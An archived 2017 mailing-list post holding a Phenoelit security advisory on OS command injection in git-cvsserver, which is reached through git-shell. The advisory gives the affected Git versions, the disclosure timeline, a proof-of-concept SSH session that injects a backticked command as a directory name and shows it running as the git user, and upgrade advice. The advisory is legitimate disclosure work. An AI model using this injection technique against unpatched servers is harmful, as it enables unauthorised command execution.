X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2641" "Tuesday" "26" "September" "2017" "11:03:49" "+0200" "joernchen" "joernchen@phenoelit.de" "<20170926090349.f5rwmd7be3tu2qad@refracta>" "91" "[oss-security] Advisory: Git cvsserver OS Command Injection" nil nil nil "9" "2017092609:03:49" "[oss-security] Advisory: Git cvsserver OS Command Injection" (number mark "U       joernchen@ph Sep 26   91/2641  " thread-indent "\"[oss-security] Advisory: Git cvsserver OS Command Injection\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 32740 invoked by uid 550); 26 Sep 2017 10:59:38 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 13776 invoked from network); 26 Sep 2017 09:04:42 -0000
Date: Tue, 26 Sep 2017 11:03:49 +0200
From: joernchen <joernchen@phenoelit.de>
To: fulldisclosure@seclists.org, oss-security@lists.openwall.com
Message-ID: <20170926090349.f5rwmd7be3tu2qad@refracta>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="x35cpt4wdz3azp7p"
Content-Disposition: inline
User-Agent: NeoMutt/20170113 (1.7.2)
X-Provags-ID: V03:K0:lQeZKUPZwlfp58ooUgOFL6wOh8jNLVacKdkThey5FP+emlSwgB3
 IFLdlE1qcTz1Ii1DQ7ZTd7zbRSDxRvLRmLZWkzoGJdV+9FqbCn7JJeve0LfmQGZRrA+khWI
 i1fLqAB6EvCMjR2k2ZafcMdYWJYdjI7UHXSM2WivCQXgoAbQ8lEXsMeOj5Chu7dktNWLnO+
 n8Pq7a4Rev9DPqScR1joQ==
X-UI-Out-Filterresults: notjunk:1;V01:K0:LVsMquMe0tY=:rQMpNzqxXQ1Whj+Z9oohg6
 36gZXfWZ8AcDgeXEYMu2QSDpf95UELl/Gy2wfrGh+aEaJ0CQTaWQylMg649jNluqj2EqywICG
 JwhaMWixdEkk6DxZxMBdTjuaefP4U/+sSlYU4VDGnXPHapvK1Tcq8cKqYGlPAH/TlQde7IQuM
 pHpGWqzXmImLC+FUm6jFM62tgeF/t0VKly+wrdIoJB57PnRotQPI63TclPbt8S3mGhd6M1WRk
 PXKO1FMTUHajEvCtQ1gsHUuHrLGfdwRvAmzUzu1XV3TFIJh6svL2gn3xbyiUm8YRgwZMmAxbV
 FQ6XB+nNcfSZqUL5FUxI8xGu8WEZPBvrKH2s36znmVMBK4G9N75HjR/27D8P6aFF6kAz+bspU
 kQUVkpor2kcQuccnFqrnRsz8GXGqOCb9Wzj0VAfyB1R/HfM84npPwiL/NylqXeVH6clSBuluW
 sc9Mk9Q08l1+P8aQrBatcheZzviNE8XgnuUVMLI/Amvz9SzxssZWw7CmG8NZxBAH2Fuka8Ge0
 ut1bRfiAzW6+LNYSsn7Ljt0TCV9KTNk9pu06PFOgjkLnlnJZlATq5y6T+M6053rE7CE9356vF
 0xe8l354FVXdNU7XLITYFpvakkm/vDNZ8h3D5+M5PcpdfaFqcjys1chq8e7PaOHTiXyevMLiS
 //lhNw2QLgegGystW59DcsLpoQiVLr9XRjeFVTrdSSmT0r7SmRtZFl/tU0hegjAdMHl4M7OJM
 AoyehIrtfGdbNI6o3RyyypqTq9Xu6L83dzqD7w==
Subject: [oss-security] Advisory: Git cvsserver OS Command Injection

--x35cpt4wdz3azp7p
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

Hi,


see attached advisory.

Cheers,

joernchen
-- 
joernchen ~ Phenoelit
<joernchen@phenoelit.de> ~ C776 3F67 7B95 03BF 5344
http://www.phenoelit.de  ~ A46A 7199 8B7B 756A F5AC

--x35cpt4wdz3azp7p
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="git_cvsserver.txt"

Phenoelit Advisory <wir-haben-auch-mal-was-gefunden #0815 ++--->

[ Authors ]
        joernchen       <joernchen () phenoelit de>

        Phenoelit Group (http://www.phenoelit.de)

[ Affected Products ]
        Git before 2.14.2, 2.13.6, 2.12.5, 2.11.4 and 2.10.5 (git-cvsserver)
        https://git-scm.com

[ Vendor communication ]
        2017-09-08 Sent vulnerability details to the git-security list
        2017-09-09 Acknowledgement of the issue, git maintainers ask if
                   a patch could be provided
        2017-09-10 Patch is provided
        2017-09-11 Further backtick operations are patched by the git
                   maintainers, corrections on the provided patch
        2017-09-11 Revised patch is sent out
        2017-09-11 Jeff King proposes to drop `git-cvsserver`'s default
                   invocation from `git-shell`
        2017-09-22 Draft release for git 2.14.2 is created including the
                   fixes
        2017-09-26 Release of this advisory, release of fixed git versions

[ Description ]
	The `git` subcommand `cvsserver` is a Perl script which makes excessive
	use of the backtick operator to invoke `git`. Unfortunately user input
        is used within some of those invocations.


	It should be noted, that `git-cvsserver` will be invoked by `git-shell`
        by default without further configuration.

[ Example ]
	Below a example of a OS Command Injection within `git-cvsserver`
        triggered via `git-shell`:

        =====8<=====
[git@host ~]$ cat .ssh/authorized_keys
command="git-shell -c \"$SSH_ORIGINAL_COMMAND\"" ssh-rsa AAAAB3NzaC ....

[joernchen@host ~]$ ssh git@localhost cvs server
Root /tmp
E /tmp/ does not seem to be a valid GIT repository
E
error 1 /tmp/ is not a valid repository
Directory .
`id>foooooo`
add
fatal: Not a git repository: '/tmp/'
Invalid module '`id>foooooo`' at /usr/lib/git-core/git-cvsserver line 3807, <STDIN> line 4.
[joernchen@host ~]$

[git@host ~]$ cat foooooo
uid=619(git) gid=618(git) groups=618(git)
[git@host ~]$
        =====>8=====

[ Solution ]
        Upgrade to one of the following git versions:
        * 2.14.2
        * 2.13.6
        * 2.12.5
        * 2.11.4
        * 2.10.5

[ end of file ]

--x35cpt4wdz3azp7p--
